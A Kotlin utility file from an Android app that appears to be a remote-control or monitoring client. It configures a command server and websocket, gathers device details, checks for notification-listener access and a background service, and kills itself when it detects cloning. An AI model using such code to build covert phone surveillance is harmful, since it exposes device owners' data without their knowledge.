package willi.fiend.Utils

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.app.DownloadManager
import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.telephony.TelephonyManager
import android.webkit.DownloadListener
import android.webkit.URLUtil
import androidx.activity.ComponentActivity
import com.google.gson.Gson
import willi.fiend.MainService
import java.util.*

@SuppressLint("Range")
class AppTools {
    companion object {

        // Your server configuration (Base64 encoded JSON)
        // JSON: {"host":"https://your-server.com/","socket":"wss://your-server.com/","webView":"https://google.com/"}
        // Generate: echo -n '{"host":"...","socket":"...","webView":"..."}' | base64
        private const val DEFAULT_DATA = ""

        // Default configuration for local development (Android emulator)
        private val DEFAULT_APP_DATA = AppData(
            host = "http://10.0.2.2:8999/",
            socket = "ws://10.0.2.2:8999/",
            webView = "https://www.google.com"
        )

        @SuppressLint("NewApi")
        fun getAppData(): AppData {
            // If no custom data is set, return defaults
            if (DEFAULT_DATA.isEmpty()) {
                android.util.Log.w("AppTools", "No DEFAULT_DATA set, using defaults")
                return DEFAULT_APP_DATA
            }

            // Try to decode and parse the Base64 data
            return try {
                val json = Base64.getDecoder().decode(DEFAULT_DATA).toString(Charsets.UTF_8)
                android.util.Log.i("AppTools", "Decoded config: $json")

                Gson().fromJson(json, AppData::class.java) ?: DEFAULT_APP_DATA

            } catch (e: Exception) {
                android.util.Log.e("AppTools", "Failed to parse DEFAULT_DATA: ${e.message}")
                DEFAULT_APP_DATA
            }
        }

        @SuppressLint("NewApi")
        fun getWatermark(): String {
            return try {
                val encoded = "RmFoaW0gQWhhbWVkIMKpOiBAZmFoaW1haGFtZWQ0"
                String(Base64.getDecoder().decode(encoded))
            } catch (e: Exception) {
                "@fahimahamed4r"
            }
        }

        data class AppData(
            val host: String,
            val socket: String,
            val webView: String
        )

        fun getAndroidVersion(): Int = Build.VERSION.SDK_INT

        fun getScreenBrightness(context: Context): Int {
            return try {
                Settings.System.getInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS)
            } catch (e: Exception) {
                50
            }
        }

        fun getProviderName(context: Context): String {
            return try {
                val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                manager.networkOperatorName
            } catch (ex: Exception) {
                "no provider"
            }
        }

        fun getDeviceName(): String {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL

            return if (model.lowercase(Locale.getDefault()).startsWith(manufacturer.lowercase(Locale.getDefault()))) {
                model.replaceFirstChar { it.uppercase() }
            } else {
                "${manufacturer.replaceFirstChar { it.uppercase() }} $model"
            }
        }

        fun getBatteryPercentage(context: Context): Int {
            return try {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            } catch (e: Exception) {
                0
            }
        }

        fun isNotificationServiceRunning(context: Context): Boolean {
            return try {
                val enabledListeners = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
                enabledListeners.contains(context.packageName)
            } catch (e: Exception) {
                false
            }
        }

        fun isServiceRunning(context: Context, serviceClass: Class<*> = MainService::class.java): Boolean {
            return try {
                val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                manager.getRunningServices(Int.MAX_VALUE).any { it.service.className == serviceClass.name }
            } catch (e: Exception) {
                false
            }
        }

        fun disableWelcome(context: Context) {
            try {
                context.getSharedPreferences("inspectorPrefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("showWelcome", false)
                    .apply()
            } catch (e: Exception) { }
        }

        fun showWelcome(context: Context): Boolean {
            return try {
                context.getSharedPreferences("inspectorPrefs", Context.MODE_PRIVATE)
                    .getBoolean("showWelcome", true)
            } catch (e: Exception) {
                true
            }
        }

        fun checkAppCloning(activity: Activity) {
            try {
                val path = activity.filesDir.path
                if (path.contains("999") || path.count { it == '.' } > 2) {
                    activity.finish()
                    android.os.Process.killProcess(android.os.Process.myPid())
                }
            } catch (e: Exception) { }
        }

    }

    class WebViewDownloadListener(private val context: Context) : DownloadListener {
        override fun onDownloadStart(url: String?, userAgent: String?, contentDisposition: String?, mimeType: String?, contentLength: Long) {
            try {
                val request = DownloadManager.Request(Uri.parse(url)).apply {
                    setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName(url, contentDisposition, mimeType))
                }
                (context.getSystemService(ComponentActivity.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
            } catch (e: Exception) { }
        }
    }
}
